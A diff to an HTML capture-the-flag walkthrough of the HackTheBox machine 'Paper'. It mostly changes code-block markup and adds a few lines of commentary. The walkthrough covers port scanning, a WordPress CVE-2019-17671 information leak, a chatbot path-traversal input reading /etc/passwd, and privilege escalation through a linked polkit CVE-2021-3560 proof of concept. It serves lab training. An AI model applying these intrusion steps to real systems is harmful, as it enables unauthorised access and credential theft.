@@ -27,9 +27,8 @@
     <section class="writeup-card">
       <h2>Nmap Scan Results</h2>
       <p>we will start by scanning open ports on the target machine, here's what nmap found:</p>
-      <pre><code>axoryn@archlinux~$ nmap -p- -sC -sV $IP -oN nmap/full-tcp.nmap 
-
-PORT    STATE SERVICE  REASON  VERSION
+      <pre class="command"><code>axoryn@archlinux~$ nmap -p- -sC -sV $IP -oN nmap/full-tcp.nmap</code></pre>
+      <pre><code>PORT    STATE SERVICE  REASON  VERSION
 22/tcp  open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
 
 80/tcp  open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
@@ -55,7 +54,7 @@ PORT    STATE SERVICE  REASON  VERSION
 
     <section class="writeup-card">
       <h2>Enumerating SSH</h2>
-      <pre><code>axoryn@archlinux~$ ssh root@10.10.11.143
+      <pre class="command"><code>axoryn@archlinux~$ ssh root@10.10.11.143
 root@10.10.11.143's password:</code></pre>
       <p>we can see here that password auth is enabled which isn't the safest. when we get credentials, let's come back here.</p>
     </section>
@@ -67,7 +66,7 @@ root@10.10.11.143's password:</code></pre>
         <img src="../images/paper/weird-header.jpg" alt="X-Backend-Server header">
       </div>
       <p>interesting.. let's add that to our /etc/hosts file:</p>
-      <pre><code>axoryn@archlinux~/CTFs/htb/paper$ echo "10.10.11.143    office.paper" | sudo tee -a /etc/hosts</code></pre>
+      <pre class="command"><code>axoryn@archlinux~/CTFs/htb/paper$ echo "10.10.11.143    office.paper" | sudo tee -a /etc/hosts</code></pre>
     </section>
 
     <section class="writeup-card">
@@ -77,7 +76,8 @@ root@10.10.11.143's password:</code></pre>
         <img src="../images/paper/wordpress-version.jpg" alt="WordPress 5.2.3">
       </div>
       <p>now that we know this is running wordpress, let's run wpscan:</p>
-      <pre><code>axoryn@archlinux~/CTFs/htb/paper$ wpscan --url http://office.paper/</code></pre>
+      <pre class="command"><code>axoryn@archlinux~/CTFs/htb/paper$ wpscan --url http://office.paper/</code></pre>
+      <p>wpscan didn't show anything too interesting.. </p>
       <p>after searching around, we find this website is vulnerable to CVE-2019-17671.</p>
       <p>going to <code>http://office.paper/?static=1</code> shows us some VERY juicy information:</p>
       <pre><code># Secret Registration URL of new Employee chat system
@@ -87,13 +87,9 @@ http://chat.office.paper/register/8qozr226AhkCHZdyY</code></pre>
     <section class="writeup-card">
       <h2>Exploring the Chat System</h2>
       <p>after going to the registration URL and signing up, we can message the recyclops bot:</p>
-      <div class="image-container">
         <p><em>testing file reading with recyclops bot</em></p>
-        <img src="../images/paper/recyclops-test.jpg" alt="Testing file reading">
-      </div>
       <p>we can use LFI to read /etc/passwd:</p>
       <pre><code>axoryn
-axoryn
 8:23 PM
 recyclops file ../../../../../../etc/passwd
 
@@ -105,21 +101,19 @@ root:x:0:0:root:/root:/bin/bash
 [...]
 dwight:x:1004:1004::/home/dwight:/bin/bash
 &lt;!=====End of file ../../../../../../etc/passwd=====&gt;</code></pre>
-      <p>after looking around a bit, we find credentials in ../hubot/ :)</p>
+      <p>after looking around a bit, we find credentials somewhere in ../hubot/ :)</p>
     </section>
 
     <section class="writeup-card">
       <h2>Privilege Escalation</h2>
       <p>after logging in with the found creds using SSH, we get user.txt!!</p>
       <p>after enumerating for a bit, i didn't find anything. so, i ran linpeas:</p>
-      <div class="image-container">
-        <img src="../images/paper/linpeas.jpg" alt="Linpeas output">
-      </div>
       <p>linpeas showed the polkit version is vulnerable! found this exploit:</p>
-      <pre><code>https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh</code></pre>
+      <pre class="command"><code>https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh</code></pre>
       <p>after running the exploit a few times, we can log in with:</p>
-      <pre><code>su - secnigma
+      <pre class="command"><code>su - secnigma
 password: secnigmaftw</code></pre>
+      <p>after that, we run sudo bash, and then we're root!!</p>
       <p>and we're root!</p>
     </section>
 
